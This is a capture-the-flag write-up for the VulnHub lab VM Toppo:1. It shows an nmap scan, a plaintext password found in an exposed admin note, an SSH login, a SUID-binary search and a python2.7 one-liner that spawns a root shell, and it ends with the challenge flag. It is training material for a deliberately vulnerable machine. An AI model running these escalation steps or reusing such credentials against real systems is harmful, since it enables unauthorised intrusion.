---
title: "CTF Write Up : Toppo 1"
description: "Toppo 1 CTF Writeup"
layout: post
---
I've been getting back into hackerering _Capture The Flag_ virtual machines from [VulnHub](https://www.vulnhub.com) recently.
To get back into the swing of things I chose [Toppo:1](https://www.vulnhub.com/entry/toppo-1,245/).
It's aimed at beginners and requires no advanced exploitation techniques or really any advanced tools,
so it's good for beginner InfoSec enthusiasts and rusty beginner InfoSec enthusiast gits like myself.

### WARNING: This write up contains spoilers for the challenge.. obviously

**DISCLAIMER: I'm not responsible for how you use the information presented in these write ups, if you do something illegal with the information presented here and get caught, it's on you.**

Now that's out of the way, let's get started. 

### Information Gathering

After firing up the target VM and identifying it's IP on the `vboxnet0` network it's time to check the running services on the target:
{% highlight terminal %}

root@kali:~# nmap -sV 192.168.56.102
-- SNIP --
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1
80/tcp  open  http    Apache httpd 2.4.10
111/tcp open  rpcbind 2-4 (RPC #100000)
-- SNIP --

{% endhighlight %}

nmap reveals http, ssh and RPC daemons running on the target.

### Checking for hidden directories, files or login pages on the webserver

Turns out there's an unprotected `admin/` directory with a text file called `note.txt`.
Here's the contents:
>Note to myself :
>
>I need to change my password :/ 12345ted123 is too outdated but the technology
>isn't my thing i prefer go fishing or watching soccer .

Looks like a set of keys to the kingdom. The username looks nested into the password.

Using the credentials to gain access via SSH:
{% highlight terminal %}

root@kali:~# ssh ted@192.168.56.102
-- SNIP --
ted@192.168.56.102's password:
-- SNIP --
ted@Toppo:~$

{% endhighlight %}

### Unprivileged Access

**hacker voice: "I'm in"**

Good, but it's not root.

### Exploiting a misconfigured SUID executable to escalate privileges

SUID which stands for "Set User ID" allows users to execute a file with the
permissions of a specified user. In this case, we want to find the executables
which run as the root even when other users execute them.

There's a great quick-start tutorial [here](https://null-byte.wonderhowto.com/how-to/use-misconfigured-suid-bit-escalate-privileges-get-root-0173929/) from null-byte on how to escape an interactive nmap session to a root shell.

Identify the executables with the SUID bit set owned by root:
{% highlight terminal %}
ted@Toppo:~$ find / -uid 0 -perm -4000 -type f 2>/dev/null
/sbin/mount.nfs
/usr/sbin/exim4
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/python2.7
/usr/bin/chsh
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/passwd
/bin/su
/bin/umount
/bin/mount
{% endhighlight %}

The thing of note in that list is python2.7, I've seen other binaries like nmap and
vim in previous vulnhub CTF's, but this is the first time I've seen python.

Python means that we can get root shell with a one liner:
{% highlight terminal %}
ted@Toppo:~$ python2.7 -c 'import os; os.system("/bin/sh")'
# whoami
root
#
{% endhighlight %}

### Capturing the flag
{% highlight terminal %}
# cd root
# ls
flag.txt
# cat flag.txt
 _________                                 
|  _   _  |
|_/ | | \_|.--.   _ .--.   _ .--.    .--.
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \
   _| |_ | \__. | | \__/ | | \__/ || \__. |
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'
                 [__|     [__|




Congratulations !
there is your flag :
0wnedlab{p4ssi0n_c0me_with_pract1ce}
{% endhighlight %}
